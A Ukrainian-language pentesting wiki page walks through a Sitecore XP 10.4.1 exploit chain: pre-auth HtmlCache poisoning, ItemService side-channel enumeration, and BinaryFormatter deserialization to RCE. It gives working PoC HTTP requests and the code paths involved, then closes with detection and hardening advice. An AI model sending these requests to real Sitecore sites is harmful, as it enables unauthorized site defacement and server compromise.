# Sitecore Experience Platform (XP) – Pre‑auth HTML Cache Poisoning до Post‑auth RCE

{{#include ../../../banners/hacktricks-training.md}}

На цій сторінці підсумовано практичний ланцюг атак проти Sitecore XP 10.4.1, який переходить від pre‑auth XAML handler до HTML cache poisoning і, через authenticated UI flow, до RCE через BinaryFormatter deserialization. Ці техніки узагальнюються для подібних версій/компонентів Sitecore і дають конкретні примітиви для тестування, виявлення та підвищення стійкості.

- Продукт, протестований на уразливість: Sitecore XP 10.4.1 rev. 011628
- Виправлено в: KB1003667, KB1003734 (червень/липень 2025)

Див. також:

{{#ref}}
../../../pentesting-web/cache-deception/README.md
{{#endref}}

{{#ref}}
../../../pentesting-web/deserialization/README.md
{{#endref}}

## Pre‑auth примітив: XAML Ajax reflection → HtmlCache write

Точка входу — pre‑auth XAML handler, зареєстрований у web.config:
```xml
<add verb="*" path="sitecore_xaml.ashx" type="Sitecore.Web.UI.XamlSharp.Xaml.XamlPageHandlerFactory, Sitecore.Kernel" name="Sitecore.XamlPageRequestHandler" />
```
Доступно через:
```
GET /-/xaml/Sitecore.Shell.Xaml.WebControl
```
Дерево контролів містить AjaxScriptManager, який у запитах подій читає attacker‑controlled поля і рефлексивно викликає методи на цільових контролах:
```csharp
// AjaxScriptManager.OnPreRender
string clientId = page.Request.Form["__SOURCE"];      // target control
string text     = page.Request.Form["__PARAMETERS"];  // Method("arg1", "arg2")
...
Dispatch(clientId, text);

// eventually → DispatchMethod(control, parameters)
MethodInfo m = ReflectionUtil.GetMethodFiltered<ProcessorMethodAttribute>(this, e.Method, e.Parameters, true);
if (m != null) m.Invoke(this, e.Parameters);

// Alternate branch for XML-based controls
if (control is XmlControl && AjaxScriptManager.DispatchXmlControl(control, args)) {...}
```
Ключове спостереження: сторінка XAML містить екземпляр XmlControl (xmlcontrol:GlobalHeader). Sitecore.XmlControls.XmlControl є похідним від Sitecore.Web.UI.WebControl (клас Sitecore), і проходить через ReflectionUtil.Filter allow‑list (Sitecore.*), що розблоковує методи Sitecore.WebControl.

Магічний метод для poisoning:
```csharp
// Sitecore.Web.UI.WebControl
protected virtual void AddToCache(string cacheKey, string html) {
HtmlCache c = CacheManager.GetHtmlCache(Sitecore.Context.Site);
if (c != null) c.SetHtml(cacheKey, html, this._cacheTimeout);
}
```
Оскільки ми можемо націлитися на xmlcontrol:GlobalHeader і викликати методи Sitecore.Web.UI.WebControl за їхніми іменами, ми отримуємо pre‑auth arbitrary HtmlCache write primitive.

### PoC request (CVE-2025-53693)
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl HTTP/2
Host: target
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("wat","<html><body>pwn</body></html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Примітки:
- __SOURCE — це clientID xmlcontrol:GlobalHeader у межах Sitecore.Shell.Xaml.WebControl (зазвичай стабільний, наприклад ctl00_ctl00_ctl05_ctl03, оскільки він походить зі статичного XAML).
- __PARAMETERS має формат Method("arg1","arg2").

## Що отруїти: побудова ключа кешу

Типова побудова ключа HtmlCache, яку використовують контролі Sitecore:
```csharp
public virtual string GetCacheKey(){
SiteContext site = Sitecore.Context.Site;
if (this.Cacheable && (site == null || site.CacheHtml) && !this.SkipCaching()){
string key = this.CachingID.Length > 0 ? this.CachingID : this.CacheKey;
if (key.Length > 0){
string k = key + "_#lang:" + Language.Current.Name.ToUpperInvariant();
if (this.VaryByData)        k += ResolveDataKeyPart();
if (this.VaryByDevice)      k += "_#dev:"   + Sitecore.Context.GetDeviceName();
if (this.VaryByLogin)       k += "_#login:" + Sitecore.Context.IsLoggedIn;
if (this.VaryByUser)        k += "_#user:"  + Sitecore.Context.GetUserName();
if (this.VaryByParm)        k += "_#parm:"  + this.Parameters;
if (this.VaryByQueryString && site?.Request != null)
k += "_#qs:"   + MainUtil.ConvertToString(site.Request.QueryString, "=", "&");
if (this.ClearOnIndexUpdate) k += "_#index";
return k;
}
}
return string.Empty;
}
```
Приклад targeted poisoning для відомого sublayout:
```
__PARAMETERS=AddToCache("/layouts/Sample+Sublayout.ascx_%23lang:EN_%23login:False_%23qs:_%23index","<html>…attacker HTML…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
## Перерахування кешованих елементів та вимірів “vary by” 

Якщо ItemService (неправильно) доступний анонімно, ви можете перерахувати компоненти, що кешуються, щоб визначити точні ключі.

Швидка перевірка:
```
GET /sitecore/api/ssc/item
// 404 Sitecore error body → exposed (anonymous)
// 403 → blocked/auth required
```
Список кешованих елементів та прапорців:
```
GET /sitecore/api/ssc/item/search?term=layouts&fields=&page=0&pagesize=100
```
Шукайте поля на кшталт Path, Cacheable, VaryByDevice, VaryByLogin, ClearOnIndexUpdate. Імена пристроїв можна перерахувати через:
```
GET /sitecore/api/ssc/item/search?term=_templatename:Device&fields=ItemName&page=0&pagesize=100
```
### Side‑channel enumeration under restricted identities (CVE-2025-53694)

Навіть коли ItemService видає себе за обмежений обліковий запис (наприклад, ServicesAPI) і повертає порожній Results array, TotalCount все одно може відображати pre‑ACL Solr hits. Можна brute‑force item groups/ids із wildcards і спостерігати, як TotalCount збігається, щоб створити карту внутрішнього вмісту й пристроїв:
```
GET /sitecore/api/ssc/item/search?term=%2B_templatename:Device;%2B_group:a*&fields=&page=0&pagesize=100&includeStandardTemplateFields=true
→ "TotalCount": 3
GET /...term=%2B_templatename:Device;%2B_group:aa*
→ "TotalCount": 2
GET /...term=%2B_templatename:Device;%2B_group:aa30d078ed1c47dd88ccef0b455a4cc1*
→ narrow to a specific item
```
## Післяавторизаційне RCE: BinaryFormatter sink in convertToRuntimeHtml (CVE-2025-53691)

Sink:
```csharp
// Sitecore.Convert
byte[] b = Convert.FromBase64String(data);
return new BinaryFormatter().Deserialize(new MemoryStream(b));
```
Доступно через крок pipeline convertToRuntimeHtml — ConvertWebControls, який шукає елемент з id {iframeId}_inner, декодує base64 і десеріалізує його, а потім вставляє отриманий рядок у HTML:
```csharp
HtmlNode inner = doc.SelectSingleNode("//*[@id='"+id+"_inner']");
string text2   = inner?.GetAttributeValue("value", "");
if (text2.Length > 0)
htmlNode2.InnerHtml = StringUtil.GetString(Sitecore.Convert.Base64ToObject(text2) as string);
```
Запуск (авторизований, права Content Editor). Діалог FixHtml викликає convertToRuntimeHtml. Енд-ту-енд без кліків у UI:
```
// 1) Start Content Editor
GET /sitecore/shell/Applications/Content%20Editor.aspx

// 2) Load malicious HTML into EditHtml session (XAML event)
POST /sitecore/shell/-/xaml/Sitecore.Shell.Applications.ContentEditor.Dialogs.EditHtml.aspx
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=edithtml:fix&...&ctl00$ctl00$ctl05$Html=
<html>
<iframe id="test" src="poc" value="poc"></iframe>
<test id="test_inner" value="BASE64_GADGET"></test>
</html>

// 3) Server returns a session handle (hdl) for FixHtml
{"command":"ShowModalDialog","value":"/sitecore/shell/-/xaml/Sitecore.Shell.Applications.ContentEditor.Dialogs.FixHtml.aspx?hdl=..."}

// 4) Visit FixHtml to trigger ConvertWebControls → deserialization
GET /sitecore/shell/-/xaml/Sitecore.Shell.Applications.ContentEditor.Dialogs.FixHtml.aspx?hdl=...
```
Gadget generation: use ysoserial.net / YSoNet with BinaryFormatter to produce a base64 payload returning a string. The string’s contents are written into the HTML by ConvertWebControls after deserialization side‑effects execute.


{{#ref}}
../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md
{{#endref}}

## Повний ланцюг

1) Pre‑auth зловмисник отруює HtmlCache довільним HTML, рефлективно викликаючи WebControl.AddToCache через XAML AjaxScriptManager.
2) Отруєний HTML доставляє JavaScript, який підштовхує автентифікованого користувача Content Editor пройти через потік FixHtml.
3) Сторінка FixHtml запускає convertToRuntimeHtml → ConvertWebControls, що десеріалізує base64, контрольований атакуючим, через BinaryFormatter → RCE під ідентифікатором пулу додатків Sitecore.

## Виявлення

- Pre‑auth XAML: запити до `/-/xaml/Sitecore.Shell.Xaml.WebControl` з `__ISEVENT=1`, підозрілим `__SOURCE` та `__PARAMETERS=AddToCache(...)`.
- ItemService probing: сплески wildcard-запитів до `/sitecore/api/ssc`, великий `TotalCount` з порожнім `Results`.
- Deserialization attempts: `EditHtml.aspx` після чого `FixHtml.aspx?hdl=...` і незвично великий base64 у полях HTML.

## Посилення захисту

- Apply Sitecore patches KB1003667 and KB1003734; gate/disable pre‑auth XAML handlers або додати сувору валідацію; моніторити і лімітувати швидкість `/-/xaml/`.
- Remove/replace BinaryFormatter; обмежити доступ до convertToRuntimeHtml або забезпечити сильну серверну валідацію потоків редагування HTML.
- Lock down `/sitecore/api/ssc` to loopback or authenticated roles; уникати шаблонів impersonation, які дозволяють leak `TotalCount`‑based side channels.
- Enforce MFA/least privilege для користувачів Content Editor; переглянути CSP щоб зменшити вплив JS steering від cache poisoning.

## References

- [watchTowr Labs – Cache Me If You Can: Sitecore Experience Platform Cache Poisoning to RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Sitecore KB1003667 – Security patch](https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1003667)
- [Sitecore KB1003734 – Security patch](https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1003734)

{{#include ../../../banners/hacktricks-training.md}}
